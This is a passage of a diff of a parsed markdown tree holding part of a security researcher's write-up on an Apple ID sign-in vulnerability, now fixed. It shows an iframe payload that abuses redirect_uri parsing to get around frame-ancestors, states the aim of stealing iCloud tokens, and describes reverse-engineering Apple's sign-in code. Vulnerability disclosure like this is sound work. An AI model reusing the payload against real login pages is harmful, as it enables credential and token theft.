>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "If you want to replicate this moment as I experienced it, close your eyes;\nimagine yourself really sick with flu and say 'fuck. oh my god. what the fuck.'.\nNow you understand.",
>                   "position": {
>                     "start": {
>                       "line": 453,
>                       "column": 1,
>                       "offset": 21677
>                     },
>                     "end": {
>                       "line": 455,
>                       "column": 20,
>                       "offset": 21854
>                     },
>                     "indent": [
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 453,
>                   "column": 1,
>                   "offset": 21677
>                 },
>                 "end": {
>                   "line": 455,
>                   "column": 20,
>                   "offset": 21854
>                 },
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Alright. I realise I forgot to tell you to open your eyes again. If they're\nstill closed you should open them.",
>                   "position": {
>                     "start": {
>                       "line": 457,
>                       "column": 1,
>                       "offset": 21858
>                     },
>                     "end": {
>                       "line": 458,
>                       "column": 35,
>                       "offset": 21969
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 457,
>                   "column": 1,
>                   "offset": 21858
>                 },
>                 "end": {
>                   "line": 458,
>                   "column": 35,
>                   "offset": 21969
>                 },
>                 "indent": [
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Next step: embed the iCloud login page in our page and pretend to be iCloud\n(easy right?) if we can do this, we should just be able to steal the icloud\ntoken it returns.",
>                   "position": {
>                     "start": {
>                       "line": 460,
>                       "column": 1,
>                       "offset": 21973
>                     },
>                     "end": {
>                       "line": 462,
>                       "column": 18,
>                       "offset": 22144
>                     },
>                     "indent": [
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 460,
>                   "column": 1,
>                   "offset": 21973
>                 },
>                 "end": {
>                   "line": 462,
>                   "column": 18,
>                   "offset": 22144
>                 },
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Going from this to having an actual ",
>                   "position": {
>                     "start": {
>                       "line": 464,
>                       "column": 1,
>                       "offset": 22148
>                     },
>                     "end": {
>                       "line": 464,
>                       "column": 37,
>                       "offset": 22184
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "redirect_uri",
>                   "position": {
>                     "start": {
>                       "line": 464,
>                       "column": 37,
>                       "offset": 22184
>                     },
>                     "end": {
>                       "line": 464,
>                       "column": 51,
>                       "offset": 22198
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " we can use takes quite a bit\nof doing since Apple is so stringent on the characters we're allowed to use.\nTypically, we'd just send ",
>                   "position": {
>                     "start": {
>                       "line": 464,
>                       "column": 51,
>                       "offset": 22198
>                     },
>                     "end": {
>                       "line": 466,
>                       "column": 27,
>                       "offset": 22333
>                     },
>                     "indent": [
>                       1,
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": " '*'",
>                   "position": {
>                     "start": {
>                       "line": 466,
>                       "column": 27,
>                       "offset": 22333
>                     },
>                     "end": {
>                       "line": 466,
>                       "column": 33,
>                       "offset": 22339
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " to tell ",
>                   "position": {
>                     "start": {
>                       "line": 466,
>                       "column": 33,
>                       "offset": 22339
>                     },
>                     "end": {
>                       "line": 466,
>                       "column": 42,
>                       "offset": 22348
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "frame-ancestors",
>                   "position": {
>                     "start": {
>                       "line": 466,
>                       "column": 42,
>                       "offset": 22348
>                     },
>                     "end": {
>                       "line": 466,
>                       "column": 59,
>                       "offset": 22365
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " anything is OK to\nembed this page, but ",
>                   "position": {
>                     "start": {
>                       "line": 466,
>                       "column": 59,
>                       "offset": 22365
>                     },
>                     "end": {
>                       "line": 467,
>                       "column": 22,
>                       "offset": 22406
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "'",
>                   "position": {
>                     "start": {
>                       "line": 467,
>                       "column": 22,
>                       "offset": 22406
>                     },
>                     "end": {
>                       "line": 467,
>                       "column": 25,
>                       "offset": 22409
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " is disallowed. Instead we'll try to make ",
>                   "position": {
>                     "start": {
>                       "line": 467,
>                       "column": 25,
>                       "offset": 22409
>                     },
>                     "end": {
>                       "line": 467,
>                       "column": 67,
>                       "offset": 22451
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "https://*",
>                   "position": {
>                     "start": {
>                       "line": 467,
>                       "column": 67,
>                       "offset": 22451
>                     },
>                     "end": {
>                       "line": 467,
>                       "column": 78,
>                       "offset": 22462
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ",\nwhich means 'any website over HTTPS.",
>                   "position": {
>                     "start": {
>                       "line": 467,
>                       "column": 78,
>                       "offset": 22462
>                     },
>                     "end": {
>                       "line": 468,
>                       "column": 37,
>                       "offset": 22501
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 464,
>                   "column": 1,
>                   "offset": 22148
>                 },
>                 "end": {
>                   "line": 468,
>                   "column": 37,
>                   "offset": 22501
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "code",
>               "lang": "HTML",
>               "meta": null,
>               "value": "<iframe\nsrc=\"https://idmsa.apple.com/appleauth/auth/authorize/signin?client_id=d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d&redirect_uri=https%3A%2F%2F*;@www.icloud.com&response_mode=web_message&response_type=code&frame_id=72948678-5374-4a90-a176-31f75bb38405&locale=en_GB\"></iframe>",
>               "position": {
>                 "start": {
>                   "line": 470,
>                   "column": 1,
>                   "offset": 22505
>                 },
>                 "end": {
>                   "line": 473,
>                   "column": 4,
>                   "offset": 22823
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "If you go back in time to before this was fixed and you use this HTML code you\nwill notice two things: (1) the ",
>                   "position": {
>                     "start": {
>                       "line": 475,
>                       "column": 1,
>                       "offset": 22827
>                     },
>                     "end": {
>                       "line": 476,
>                       "column": 33,
>                       "offset": 22939
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "frame-ancestors",
>                   "position": {
>                     "start": {
>                       "line": 476,
>                       "column": 33,
>                       "offset": 22939
>                     },
>                     "end": {
>                       "line": 476,
>                       "column": 50,
>                       "offset": 22956
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " directive is correctly sent as\n",
>                   "position": {
>                     "start": {
>                       "line": 476,
>                       "column": 50,
>                       "offset": 22956
>                     },
>                     "end": {
>                       "line": 477,
>                       "column": 1,
>                       "offset": 22989
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "frame-ancestors https://*;@www.icloud.com",
>                   "position": {
>                     "start": {
>                       "line": 477,
>                       "column": 1,
>                       "offset": 22989
>                     },
>                     "end": {
>                       "line": 477,
>                       "column": 44,
>                       "offset": 23032
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " and (2) all we get from the world's\nmost overengineered embed is a big, slightly off-white box.",
>                   "position": {
>                     "start": {
>                       "line": 477,
>                       "column": 44,
>                       "offset": 23032
>                     },
>                     "end": {
>                       "line": 478,
>                       "column": 60,
>                       "offset": 23129
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 475,
>                   "column": 1,
>                   "offset": 22827
>                 },
>                 "end": {
>                   "line": 478,
>                   "column": 60,
>                   "offset": 23129
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "It's a big, slightly off-white box that's from fricken' ",
>                   "position": {
>                     "start": {
>                       "line": 480,
>                       "column": 1,
>                       "offset": 23133
>                     },
>                     "end": {
>                       "line": 480,
>                       "column": 57,
>                       "offset": 23189
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "apple.com",
>                   "position": {
>                     "start": {
>                       "line": 480,
>                       "column": 57,
>                       "offset": 23189
>                     },
>                     "end": {
>                       "line": 480,
>                       "column": 68,
>                       "offset": 23200
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", but still!",
>                   "position": {
>                     "start": {
>                       "line": 480,
>                       "column": 68,
>                       "offset": 23200
>                     },
>                     "end": {
>                       "line": 480,
>                       "column": 80,
>                       "offset": 23212
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 480,
>                   "column": 1,
>                   "offset": 23133
>                 },
>                 "end": {
>                   "line": 480,
>                   "column": 80,
>                   "offset": 23212
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": ";import box from './box.png';",
>                   "position": {
>                     "start": {
>                       "line": 482,
>                       "column": 1,
>                       "offset": 23216
>                     },
>                     "end": {
>                       "line": 482,
>                       "column": 30,
>                       "offset": 23245
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 482,
>                   "column": 1,
>                   "offset": 23216
>                 },
>                 "end": {
>                   "line": 482,
>                   "column": 30,
>                   "offset": 23245
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "jsx",
>               "value": "<img src={box}/>",
>               "position": {
>                 "start": {
>                   "line": 484,
>                   "column": 1,
>                   "offset": 23249
>                 },
>                 "end": {
>                   "line": 484,
>                   "column": 17,
>                   "offset": 23265
>                 },
>                 "indent": []
>               }
>             }
>           ],
>           "data": {
>             "hName": "section"
6346,6352c8882,8921
<           "type": "text",
<           "value": " accepts\n",
<           "position": {
<             "start": {
<               "line": 362,
<               "column": 37,
<               "offset": 17624
---
>           "type": "section",
>           "depth": 2,
>           "children": [
>             {
>               "type": "heading",
>               "depth": 2,
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "A Big, Slightly Off-White Box",
>                   "position": {
>                     "start": {
>                       "line": 487,
>                       "column": 1,
>                       "offset": 23271
>                     },
>                     "end": {
>                       "line": 487,
>                       "column": 30,
>                       "offset": 23300
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 487,
>                   "column": 1,
>                   "offset": 23271
>                 },
>                 "end": {
>                   "line": 488,
>                   "column": 30,
>                   "offset": 23331
>                 },
>                 "indent": [
>                   1
>                 ]
>               }
6354,6357c8923,8941
<             "end": {
<               "line": 363,
<               "column": 1,
<               "offset": 17634
---
>             {
>               "type": "definition",
>               "identifier": "a big, slightly off-white box",
>               "label": "A Big, Slightly Off-White Box",
>               "title": null,
>               "url": "#url-parsing-my-old-friend",
>               "position": {
>                 "start": {
>                   "line": 490,
>                   "column": 1,
>                   "offset": 23335
>                 },
>                 "end": {
>                   "line": 490,
>                   "column": 60,
>                   "offset": 23394
>                 },
>                 "indent": []
>               }
6359,6361c8943,10551
<             "indent": [
<               1
<             ]
---
>             {
>               "type": "definition",
>               "identifier": "§5",
>               "label": "§5",
>               "title": null,
>               "url": "#url-parsing-my-old-friend",
>               "position": {
>                 "start": {
>                   "line": 492,
>                   "column": 1,
>                   "offset": 23398
>                 },
>                 "end": {
>                   "line": 492,
>                   "column": 33,
>                   "offset": 23430
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "There are readers among us, I imagine who see the previous few hundreds of words\nand think 'oh, good, we must be reaching the end, we've done the impossible and\nembedded Apple ID Signin. The author is so great i rate all of their blog posts\n10 out of 10 what an amazing blogger'.",
>                   "position": {
>                     "start": {
>                       "line": 494,
>                       "column": 1,
>                       "offset": 23434
>                     },
>                     "end": {
>                       "line": 497,
>                       "column": 39,
>                       "offset": 23716
>                     },
>                     "indent": [
>                       1,
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 494,
>                   "column": 1,
>                   "offset": 23434
>                 },
>                 "end": {
>                   "line": 497,
>                   "column": 39,
>                   "offset": 23716
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "But you'd be wrong. We arrive only at the beginninning of by far the longest\nvulnerability I have ever found in a web application. It starts with this white\nbox.",
>                   "position": {
>                     "start": {
>                       "line": 499,
>                       "column": 1,
>                       "offset": 23720
>                     },
>                     "end": {
>                       "line": 501,
>                       "column": 5,
>                       "offset": 23883
>                     },
>                     "indent": [
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 499,
>                   "column": 1,
>                   "offset": 23720
>                 },
>                 "end": {
>                   "line": 501,
>                   "column": 5,
>                   "offset": 23883
>                 },
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Let's engage in a socratic diaglogue. I'll be Euclid.",
>                   "position": {
>                     "start": {
>                       "line": 503,
>                       "column": 1,
>                       "offset": 23887
>                     },
>                     "end": {
>                       "line": 503,
>                       "column": 54,
>                       "offset": 23940
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 503,
>                   "column": 1,
>                   "offset": 23887
>                 },
>                 "end": {
>                   "line": 503,
>                   "column": 54,
>                   "offset": 23940
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "blockquote",
>               "children": [
>                 {
>                   "type": "paragraph",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "Euclid: Why is there a white box?",
>                       "position": {
>                         "start": {
>                           "line": 505,
>                           "column": 3,
>                           "offset": 23946
>                         },
>                         "end": {
>                           "line": 505,
>                           "column": 36,
>                           "offset": 23979
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 505,
>                       "column": 3,
>                       "offset": 23946
>                     },
>                     "end": {
>                       "line": 505,
>                       "column": 36,
>                       "offset": 23979
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "paragraph",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "You: Why am I in this? I thought I was\nthe reader.",
>                       "position": {
>                         "start": {
>                           "line": 507,
>                           "column": 3,
>                           "offset": 23986
>                         },
>                         "end": {
>                           "line": 508,
>                           "column": 12,
>                           "offset": 24037
>                         },
>                         "indent": [
>                           1
>                         ]
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 507,
>                       "column": 3,
>                       "offset": 23986
>                     },
>                     "end": {
>                       "line": 508,
>                       "column": 12,
>                       "offset": 24037
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "paragraph",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "Euclid: Why is there a white box?",
>                       "position": {
>                         "start": {
>                           "line": 510,
>                           "column": 3,
>                           "offset": 24044
>                         },
>                         "end": {
>                           "line": 510,
>                           "column": 36,
>                           "offset": 24077
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 510,
>                       "column": 3,
>                       "offset": 24044
>                     },
>                     "end": {
>                       "line": 510,
>                       "column": 36,
>                       "offset": 24077
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "paragraph",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "You: Cancel. Quit. ^C",
>                       "position": {
>                         "start": {
>                           "line": 512,
>                           "column": 3,
>                           "offset": 24084
>                         },
>                         "end": {
>                           "line": 512,
>                           "column": 24,
>                           "offset": 24105
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 512,
>                       "column": 3,
>                       "offset": 24084
>                     },
>                     "end": {
>                       "line": 512,
>                       "column": 24,
>                       "offset": 24105
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "paragraph",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "Euclid: Why is there a white box?",
>                       "position": {
>                         "start": {
>                           "line": 514,
>                           "column": 3,
>                           "offset": 24112
>                         },
>                         "end": {
>                           "line": 514,
>                           "column": 36,
>                           "offset": 24145
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 514,
>                       "column": 3,
>                       "offset": 24112
>                     },
>                     "end": {
>                       "line": 514,
>                       "column": 36,
>                       "offset": 24145
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "paragraph",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "You (sighing): Because even though we've\nloaded the Apple ID signin page, it hasn't loaded any content",
>                       "position": {
>                         "start": {
>                           "line": 516,
>                           "column": 3,
>                           "offset": 24152
>                         },
>                         "end": {
>                           "line": 517,
>                           "column": 62,
>                           "offset": 24255
>                         },
>                         "indent": [
>                           1
>                         ]
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 516,
>                       "column": 3,
>                       "offset": 24152
>                     },
>                     "end": {
>                       "line": 517,
>                       "column": 62,
>                       "offset": 24255
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "paragraph",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "Euclid: Why hasn't it loaded any content?",
>                       "position": {
>                         "start": {
>                           "line": 519,
>                           "column": 3,
>                           "offset": 24262
>                         },
>                         "end": {
>                           "line": 519,
>                           "column": 44,
>                           "offset": 24303
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 519,
>                       "column": 3,
>                       "offset": 24262
>                     },
>                     "end": {
>                       "line": 519,
>                       "column": 44,
>                       "offset": 24303
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "paragraph",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "You: I don't know? You tell me. It's your\narticle dude",
>                       "position": {
>                         "start": {
>                           "line": 521,
>                           "column": 3,
>                           "offset": 24310
>                         },
>                         "end": {
>                           "line": 522,
>                           "column": 13,
>                           "offset": 24365
>                         },
>                         "indent": [
>                           1
>                         ]
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 521,
>                       "column": 3,
>                       "offset": 24310
>                     },
>                     "end": {
>                       "line": 522,
>                       "column": 13,
>                       "offset": 24365
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "paragraph",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "Euclid (me): ok sure whatever",
>                       "position": {
>                         "start": {
>                           "line": 524,
>                           "column": 3,
>                           "offset": 24372
>                         },
>                         "end": {
>                           "line": 524,
>                           "column": 32,
>                           "offset": 24401
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 524,
>                       "column": 3,
>                       "offset": 24372
>                     },
>                     "end": {
>                       "line": 524,
>                       "column": 32,
>                       "offset": 24401
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "paragraph",
>                   "children": [
>                     {
>                       "type": "linkReference",
>                       "identifier": "euclid",
>                       "label": "Euclid",
>                       "referenceType": "shortcut",
>                       "children": [
>                         {
>                           "type": "text",
>                           "value": "Euclid",
>                           "position": {
>                             "start": {
>                               "line": 526,
>                               "column": 4,
>                               "offset": 24409
>                             },
>                             "end": {
>                               "line": 526,
>                               "column": 10,
>                               "offset": 24415
>                             },
>                             "indent": []
>                           }
>                         }
>                       ],
>                       "position": {
>                         "start": {
>                           "line": 526,
>                           "column": 3,
>                           "offset": 24408
>                         },
>                         "end": {
>                           "line": 526,
>                           "column": 11,
>                           "offset": 24416
>                         },
>                         "indent": []
>                       }
>                     },
>                     {
>                       "type": "text",
>                       "value": " has quit\n",
>                       "position": {
>                         "start": {
>                           "line": 526,
>                           "column": 11,
>                           "offset": 24416
>                         },
>                         "end": {
>                           "line": 527,
>                           "column": 1,
>                           "offset": 24427
>                         },
>                         "indent": [
>                           1
>                         ]
>                       }
>                     },
>                     {
>                       "type": "linkReference",
>                       "identifier": "leaving...",
>                       "label": "Leaving...",
>                       "referenceType": "shortcut",
>                       "children": [
>                         {
>                           "type": "text",
>                           "value": "Leaving...",
>                           "position": {
>                             "start": {
>                               "line": 527,
>                               "column": 2,
>                               "offset": 24428
>                             },
>                             "end": {
>                               "line": 527,
>                               "column": 12,
>                               "offset": 24438
>                             },
>                             "indent": []
>                           }
>                         }
>                       ],
>                       "position": {
>                         "start": {
>                           "line": 527,
>                           "column": 1,
>                           "offset": 24427
>                         },
>                         "end": {
>                           "line": 527,
>                           "column": 13,
>                           "offset": 24439
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 526,
>                       "column": 3,
>                       "offset": 24408
>                     },
>                     "end": {
>                       "line": 527,
>                       "column": 13,
>                       "offset": 24439
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 505,
>                   "column": 1,
>                   "offset": 23944
>                 },
>                 "end": {
>                   "line": 527,
>                   "column": 13,
>                   "offset": 24439
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "You're right. The box is still white because it hasn't loaded any content. Why?\nLikely as a security measure, the login dialog expects initialization.",
>                   "position": {
>                     "start": {
>                       "line": 529,
>                       "column": 1,
>                       "offset": 24443
>                     },
>                     "end": {
>                       "line": 530,
>                       "column": 71,
>                       "offset": 24594
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 529,
>                   "column": 1,
>                   "offset": 24443
>                 },
>                 "end": {
>                   "line": 530,
>                   "column": 71,
>                   "offset": 24594
>                 },
>                 "indent": [
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "I guessed early and correctly that the dialog probably needs ",
>                   "position": {
>                     "start": {
>                       "line": 532,
>                       "column": 1,
>                       "offset": 24598
>                     },
>                     "end": {
>                       "line": 532,
>                       "column": 62,
>                       "offset": 24659
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "postMessage",
>                   "position": {
>                     "start": {
>                       "line": 532,
>                       "column": 62,
>                       "offset": 24659
>                     },
>                     "end": {
>                       "line": 532,
>                       "column": 75,
>                       "offset": 24672
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": "\ninitialization, especially considering the designation of the auth flow as\n",
>                   "position": {
>                     "start": {
>                       "line": 532,
>                       "column": 75,
>                       "offset": 24672
>                     },
>                     "end": {
>                       "line": 534,
>                       "column": 1,
>                       "offset": 24750
>                     },
>                     "indent": [
>                       1,
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "web_message",
>                   "position": {
>                     "start": {
>                       "line": 534,
>                       "column": 1,
>                       "offset": 24750
>                     },
>                     "end": {
>                       "line": 534,
>                       "column": 14,
>                       "offset": 24763
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ".",
>                   "position": {
>                     "start": {
>                       "line": 534,
>                       "column": 14,
>                       "offset": 24763
>                     },
>                     "end": {
>                       "line": 534,
>                       "column": 15,
>                       "offset": 24764
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 532,
>                   "column": 1,
>                   "offset": 24598
>                 },
>                 "end": {
>                   "line": 534,
>                   "column": 15,
>                   "offset": 24764
>                 },
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "I spent a lot of time trying to reverse engineer the ",
>                   "position": {
>                     "start": {
>                       "line": 536,
>                       "column": 1,
>                       "offset": 24768
>                     },
>                     "end": {
>                       "line": 536,
>                       "column": 54,
>                       "offset": 24821
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "idmsa.apple.com",
>                   "position": {
>                     "start": {
>                       "line": 536,
>                       "column": 54,
>                       "offset": 24821
>                     },
>                     "end": {
>                       "line": 536,
>                       "column": 71,
>                       "offset": 24838
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": "  code,\nwhich is all highly compressed and minified.",
>                   "position": {
>                     "start": {
>                       "line": 536,
>                       "column": 71,
>                       "offset": 24838
>                     },
>                     "end": {
>                       "line": 537,
>                       "column": 45,
>                       "offset": 24891
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 536,
>                   "column": 1,
>                   "offset": 24768
>                 },
>                 "end": {
>                   "line": 537,
>                   "column": 45,
>                   "offset": 24891
>                 },
>                 "indent": [
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "A key observation that led me through the 47,128 lines of code in ",
>                   "position": {
>                     "start": {
>                       "line": 539,
>                       "column": 1,
>                       "offset": 24895
>                     },
>                     "end": {
>                       "line": 539,
>                       "column": 67,
>                       "offset": 24961
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "app.js",
>                   "position": {
>                     "start": {
>                       "line": 539,
>                       "column": 67,
>                       "offset": 24961
>                     },
>                     "end": {
>                       "line": 539,
>                       "column": 75,
>                       "offset": 24969
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " which\npower the Apple ID signin process was that because my 'client' that was\nembedding the Apple ID system was 'misconfigured' (i.e. fucking broken) Apple ID\nsent a message to a log system every time telling it something that went wrong.",
>                   "position": {
>                     "start": {
>                       "line": 539,
>                       "column": 75,
>                       "offset": 24969
>                     },
>                     "end": {
>                       "line": 542,
>                       "column": 80,
>                       "offset": 25211
>                     },
>                     "indent": [
>                       1,
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 539,
>                   "column": 1,
>                   "offset": 24895
>                 },
>                 "end": {
>                   "line": 542,
>                   "column": 80,
>                   "offset": 25211
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "code",
>               "lang": "json",
>               "meta": null,
>               "value": "{\"type\":\"ERROR\",\"title\":\"PMRPErrorMessageSequence\",\"message\":\"APPLE ID : PMRPC Message Sequence log fail at AuthWidget.\",\"iframeId\":\"601683d3-4d35-4edf-a33e-6d3266709de3\",\"details\":\"{\\\"m\\\":\\\"a:28632989 b:DEA2CA08 c:req h:rPR e:wSR:SR|a:28633252 b:196F05FD c:req h:rPR e:wSR:SR|a:28633500 b:DEA2CA08 c:rRE f:Application error. Destination unavailable. 500 h:rPR e:f2:rRE|a:28633598 b:B74DD348 c:req h:rPR e:wSR:SR|a:28633765 b:196F05FD c:rRE f:Application error. Destination unavailable. 500 h:rPR e:f2:rRE|a:28634110 b:BE7671A8 c:req h:rPR e:wSR:SR|a:28634110 b:B74DD348 c:rRE f:Application error. Destination unavailable. 500 h:rPR e:f2:rRE|a:28634621 b:BE7671A8 c:rRE f:Application error. Destination unavailable. 500 h:rPR e:f2:rRE|a:28635123 b:E6F267A9 c:req h:rPR e:wSR:SR|a:28635130 b:25A38CEC c:req h:r e:wSR:SR|a:28635635 b:E6F267A9 c:rRE f:Application error. Destination unavailable. 500 h:rPR e:f2:rRE|a:28636142 b:25A38CEC c:rRE f:Application error. Destination unavailable. 1000 h:r e:f2:rRE\\\",\\\"pageVisibilityState\\\":\\\"visible\\\"}\"}",
>               "position": {
>                 "start": {
>                   "line": 544,
>                   "column": 1,
>                   "offset": 25215
>                 },
>                 "end": {
>                   "line": 546,
>                   "column": 4,
>                   "offset": 26273
>                 },
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "As you can probably tell, this mesage is completely useless for telling us what\nexactly we need to change to make our client work, but we can leverage a\ntechique I used for my ",
>                   "position": {
>                     "start": {
>                       "line": 548,
>                       "column": 1,
>                       "offset": 26277
>                     },
>                     "end": {
